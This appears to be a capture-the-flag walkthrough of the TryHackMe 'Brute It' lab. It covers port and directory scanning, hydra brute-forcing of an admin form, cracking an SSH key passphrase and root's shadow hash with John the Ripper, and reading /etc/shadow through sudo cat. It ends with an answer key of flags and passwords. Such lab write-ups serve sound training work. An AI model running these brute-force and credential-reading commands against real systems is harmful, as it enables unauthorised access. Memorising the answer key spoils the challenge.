# Task 1 About this box
----

>>In this box you will learn about:
- Brute-force
- Hash cracking
- Privilege escalation

>>Connect to the TryHackMe network, and deploy the machine.

----

# Task 2 Reconnaissance
----

>>Before attacking, let's get information about the target

```bash
root@ip-10-10-19-236:~# nmap -sC -sV 10.10.131.50

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-09 05:15 GMT
Nmap scan report for ip-10-10-131-50.eu-west-1.compute.internal (10.10.131.50)
Host is up (0.068s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:EF:8B:7C:B4:C5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds

root@ip-10-10-19-236:~# gobuster dir -u http://10.10.131.50 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.131.50
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/01/09 05:18:33 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/server-status (Status: 403)
===============================================================
2022/01/09 05:20:00 Finished
===============================================================
```

----

# Task 3 Getting a shell
----

>>Find a form to get a shell on SSH.

```bash
root@ip-10-10-19-236:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.131.50 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
[80][http-post-form] host: 10.10.131.50   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-01-09 05:31:32
```

>>Go to the url below to get the web flag and id_rsa to ssh.  
>>URL:http://10.10.131.50/admin/panel/

```
Hello john, finish the development of the site, here's your RSA private key.
THM{brut3_f0rce_is_e4sy}
```

```bash
root@ip-10-10-19-236:~# nano id_rsa 
root@ip-10-10-19-236:~# chmod 600 id_rsa 
root@ip-10-10-19-236:~# /opt/john/ssh2john.py id_rsa > forjohn.txt
root@ip-10-10-19-236:~# john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)
1g 0:00:00:08 DONE (2022-01-09 05:36) 0.1141g/s 1637Kp/s 1637Kc/s 1637KC/s *7¡Vamos!
Session completed. 

root@ip-10-10-19-236:~# ssh -i id_rsa john@10.10.131.50
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan  9 05:39:27 UTC 2022

  System load:  0.08               Processes:           103
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 39%                IP address for eth0: 10.10.131.50
  Swap usage:   0%

63 packages can be updated.
0 updates are security updates.
Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106

john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
```

----

# Task 4 Privilege Escalation
----

>>Now, we need to escalate our privileges.

```bash
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat

john@bruteit:~$ LFILE=/root/root.txt
john@bruteit:~$ sudo cat "$LFILE"
THM{pr1v1l3g3_3sc4l4t10n}

john@bruteit:~$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::

root@ip-10-10-19-236:~# nano hash.txt 
root@ip-10-10-19-236:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (?)
1g 0:00:00:00 DONE (2020-11-06 18:28) 3.030g/s 1163p/s 1163c/s 1163C/s 123456..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

john@bruteit:~$ su root
Password: 
root@bruteit:/home/john#
```

----

# ANSWER THE FOLLOWING :
----

1.Deploy the machine
>>No answer needed

Search for open ports using nmap.
2.How many ports are open?
>>2

3.What version of SSH is running?
>>OpenSSH 7.6p1

4.What version of Apache is running?
>>2.4.29

5.Which Linux distribution is running?
>>Ubuntu

Search for hidden directories on web server.
6.What is the hidden directory?
>>/admin

7.What is the user:password of the admin panel?
>>admin:xavier

Crack the RSA key you found.
8.What is John's RSA Private Key passphrase?
>>rockinroll

9.user.txt
>>THM{a_password_is_not_a_barrier}

10.Web flag
>>THM{brut3_f0rce_is_e4sy}

Find a form to escalate your privileges.
11.What is the root's password?
>>football

12.root.txt
>>THM{pr1v1l3g3_3sc4l4t10n}

----